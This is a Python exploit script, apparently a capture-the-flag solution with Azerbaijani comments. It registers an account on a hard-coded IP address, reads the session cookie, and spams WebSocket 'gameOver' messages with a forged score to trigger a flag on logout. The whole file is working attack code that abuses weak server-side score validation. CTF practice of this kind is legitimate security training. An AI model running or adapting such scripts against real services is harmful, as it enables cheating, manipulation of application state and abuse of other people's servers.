import websocket
import json
import threading
import requests
import time

# === Ayarlar ===
host = "3.238.116.223"
ws_url = f"ws://{host}/"
login_url = f"http://{host}/login"
register_url = f"http://{host}/register"
logout_url = f"http://{host}/logout"

# === İstifadəçi yaradılması ===
def gen_username():
    return "azee"

def get_token():
    username = gen_username()
    password = "ctf"
    print(f"[+] İstifadəçi: {username}")
    
    # Qeydiyyat
    requests.post(register_url, data={"username": username, "password": password})

    # Login
    session = requests.Session()
    session.post(login_url, data={"username": username, "password": password})
    cookies = session.cookies.get_dict()
    
    token = cookies.get("user")
    if not token:
        print("[x] Token alınmadı.")
        exit(1)
    return token

# === WebSocket score göndərici ===
def score_spam(token, repeat=50, delay=0.01):
    for i in range(repeat):
        try:
            ws = websocket.create_connection(ws_url, header=[f"Cookie: user={token}"])
            payload = {
                "type": "gameOver",
                "time": "now",
                "score": "10001abc"
            }
            ws.send(json.dumps(payload))
            print(f"[✓] Thread {threading.current_thread().name} → Score {i+1}/{repeat}")
            ws.close()
            time.sleep(delay)
        except Exception as e:
            print(f"[x] WebSocket error: {e}")

# === Flag üçün logout ===
def get_flag(token):
    try:
        r = requests.get(logout_url, cookies={"user": token})
        print("\n[+] Logout cavabı:")
        print(r.text)
    except Exception as e:
        print(f"[x] Logout error: {e}")

# === Əsas funksiya ===
def main():
    token = get_token()
    print(f"[+] Token alındı: {token[:20]}...")

    threads = []
    for i in range(1):  # 8 paralel hücum
        t = threading.Thread(target=score_spam, args=(token,), name=f"T{i+1}")
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n[✓] Bütün score göndərişləri bitdi. Flag yoxlanır...")
    time.sleep(1)
    get_flag(token)

if __name__ == "__main__":
    main()
